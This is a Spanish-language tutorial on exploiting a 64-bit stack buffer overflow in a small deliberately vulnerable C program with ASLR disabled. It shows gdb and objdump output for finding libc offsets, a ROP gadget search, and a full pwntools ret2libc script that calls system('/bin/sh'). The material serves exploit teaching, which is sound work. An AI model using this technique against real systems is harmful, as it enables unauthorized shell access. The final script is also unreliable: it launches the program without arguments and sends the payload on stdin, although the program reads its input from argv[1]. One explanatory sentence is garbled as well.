# Explicación de exploit 64 bits

Este ejercicio ilustra cómo se haría una explotación en un entorno de 64 bits. 
Importante: Se va a hacer con ASLR desactivado. En el ejercicio de format string (el reto), tendremos ASLR activo y veremos cómo hacer bypass. 

## Código fuente

El código fuente es: 

```c
#include<stdio.h> 
#include<string.h> 

void vuln(char *cadena)
{ 
  char buf[100]; 
  strcpy(buf,cadena); 
  printf("Input was: %s\n",buf); 
}
void main(int argc, char *argv[]) 
{
  vuln(argv[1]);
}
```



#### Análisis de la vulnerabilidad. 

La vulnerabilidad es la típica de buffer overflow. Tendremos que encontrar el offset. Tenemos un offset de 120 bytes. 


#### Búsqueda de las direcciones en libc  

Tenemos que encontrar las direcciones para ejecutar  `system ("/bin/sh")`. Como nuestro ejecutable no contiene la llamada Para eso inspeccionamos la libc: 

```
# ldd vuln
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)

# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Volcamos el desensamblado (formato Intel) en el fichero dump

# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Buscamos /bin/sh y la encontramos en el offset 0x183cee
 183cee /bin/sh
 
# cat dump | grep system
0000000000046ff0 <__libc_system@@GLIBC_PRIVATE>:
   46ff3:       74 0b                   je     47000 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000129b50 <svcerr_systemerr@@GLIBC_2.2.5>:
  129ba7:       75 05                   jne    129bae <svcerr_systemerr@@GLIBC_2.2.5+0x5e> 

```
Anotamos los siguientes offsets: 

`system:  0x46ff0` 

`/bin/sh: 0x183cee`

Ahora sumamos dicho offset a la dirección base en la que se carga la LIBC (la comprobamos con gdb, dado que no cambiará porque no está habilitado el ASLR): 

```
root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
Reading symbols from vuln...done.
gdb-peda$ b main 
Breakpoint 1 at 0x1154: file vuln.c, line 7.
gdb-peda$ run
gdb-peda$ vmmap
Start              End                Perm      Name
0x0000555555554000 0x0000555555555000 r--p      vuln
0x0000555555555000 0x0000555555556000 r-xp      vuln
0x0000555555556000 0x0000555555557000 r--p      vuln
0x0000555555557000 0x0000555555558000 r--p      vuln
0x0000555555558000 0x0000555555559000 rw-p      vuln
0x00007ffff7def000 0x00007ffff7e14000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7e14000 0x00007ffff7f5b000 r-xp      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f5b000 0x00007ffff7fa4000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa4000 0x00007ffff7fa5000 ---p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa5000 0x00007ffff7fa8000 r--p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fa8000 0x00007ffff7fab000 rw-p      /lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fab000 0x00007ffff7fb1000 rw-p      mapped
0x00007ffff7fd0000 0x00007ffff7fd3000 r--p      [vvar]
0x00007ffff7fd3000 0x00007ffff7fd5000 r-xp      [vdso]
0x00007ffff7fd5000 0x00007ffff7fd6000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd6000 0x00007ffff7ff4000 r-xp      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]

```

Dirección de carga de libc: 

`libc_base = 0x00007ffff7def000`



### Encontrando un gadget

Finalmente, tenemos que encontrar un gadget para poder cargar en RDI la información correspondiente al parámetro para llamar a `system`. 

Vamos instalar rop-tool. Para ello, hacemos (está en el script de install en el repositorio): 

```
# apt-get install libcapstone-dev
# cd
# git clone https://github.com/t00sh/rop-tool.git
# cd rop-tool; make; export PATH=$PATH:/root/rop-tool
```

Ahora buscamos gadgets que sean útiles para cargar el valor de `/bin/sh` en RDI: 

```
# rop-tool gadget libc.so.6 > gadgets
# cat gadgets | grep rdi
 0x000000000002658e -> pop rdi; ret ;
 ...
```

Por tanto, tenemos el offset del gadget que estamos buscando: 

`offset_pop_rdi = 0x2658e`

### Desarrollo del exploit

```python
#!/usr/bin/python
# coding: utf-8

from pwn import *
# Definición de las direcciones (ver arriba)
libc_base = 0x00007ffff7def000
system_addr = libc_base + 0x46ff0
binsh_addr = libc_base + 0x183cee
pop_rdi = libc_base + 0x2658e

log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi: " + str(hex(pop_rdi)))
pause()

p = process ("./vuln")

# Creación del payload (técnica ROP)
payload = ""
payload += "A"*120
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# Envío del payload
p.sendline(payload)
p.recv()
p.interactive()
```

